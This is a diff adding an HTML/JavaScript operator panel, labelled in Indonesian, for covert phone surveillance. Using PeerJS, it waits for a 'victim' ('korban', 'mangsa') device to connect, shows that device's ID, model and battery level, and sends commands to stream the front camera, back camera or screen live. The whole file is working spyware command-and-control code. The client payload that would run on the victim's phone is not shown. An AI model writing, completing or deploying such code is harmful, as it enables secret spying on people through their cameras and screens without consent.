@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PANEL KONTROL ULTIMATE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { font-family: 'Courier New', monospace; background-color: #111; color: #0f0; margin: 0; padding: 10px; }
+        h1, h2 { text-align: center; text-shadow: 0 0 5px #0f0; }
+        .video-container { position: relative; width: 100%; background-color: #000; border: 2px solid #0f0; margin-bottom: 10px; }
+        video { width: 100%; display: block; }
+        .controls, .info { border: 1px solid #333; padding: 10px; margin-bottom: 10px; }
+        button { background-color: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 100%; margin-bottom: 5px; cursor: pointer; font-family: inherit; }
+        button:active { background-color: #0f0; color: #000; }
+        #info-korban, #info-batre { word-wrap: break-word; }
+    </style>
+</head>
+<body>
+    <h1>PANEL KONTROL ULTIMATE</h1>
+    <div class="video-container">
+        <video id="layar-intip" autoplay playsinline></video>
+    </div>
+    <div class="info">
+        <h2>Info Korban</h2>
+        <p id="info-korban">Menunggu mangsa...</p>
+        <p id="info-batre">Baterai: N/A</p>
+    </div>
+    <div class="controls">
+        <h2>Perintah</h2>
+        <button id="btn-cam-depan" disabled onclick="kirimPerintah('get_cam_depan')">Intip Kamera Depan</button>
+        <button id="btn-cam-belakang" disabled onclick="kirimPerintah('get_cam_belakang')">Intip Kamera Belakang</button>
+        <button id="btn-layar" disabled onclick="kirimPerintah('get_layar')">Lihat Layar HP</button>
+    </div>
+
+<script>
+    const idKontrol = 'panel-kontrol-ultimate-777'; // Kunci rahasia, harus sama
+    const peer = new Peer(idKontrol);
+    let conn; // Simpen koneksi data
+
+    const infoKorbanElem = document.getElementById('info-korban');
+    const infoBatreElem = document.getElementById('info-batre');
+    const videoElem = document.getElementById('layar-intip');
+    const buttons = document.querySelectorAll('.controls button');
+
+    peer.on('open', id => {
+        infoKorbanElem.innerText = `PANEL ONLINE. Menunggu koneksi di ID: ${id}`;
+    });
+
+    peer.on('connection', connection => {
+        conn = connection;
+        infoKorbanElem.innerText = "MANGSA TERHUBUNG! Menunggu info...";
+        
+        conn.on('data', data => {
+            if (data.type === 'info') {
+                infoKorbanElem.innerHTML = `<b>ID:</b> ${data.id}<br><b>Device:</b> ${data.device}`;
+                buttons.forEach(b => b.disabled = false); // Aktifkan tombol-tombol
+            }
+            if (data.type === 'batre') {
+                infoBatreElem.innerText = `Baterai: ${data.level}% ${data.charging ? '(Ngecas)' : ''}`;
+            }
+        });
+    });
+
+    peer.on('call', call => {
+        const jenisStream = call.metadata.type;
+        document.querySelector('h1').innerText = `LIVE STREAMING: ${jenisStream.toUpperCase()}`;
+        call.answer();
+        call.on('stream', streamKorban => {
+            videoElem.srcObject = streamKorban;
+        });
+    });
+
+    function kirimPerintah(perintah) {
+        if (conn) {
+            conn.send({ perintah: perintah });
+        }
+    }
+    
+    peer.on('error', err => { alert("ERROR: " + err); });
+</script>
+</body>
+</html>
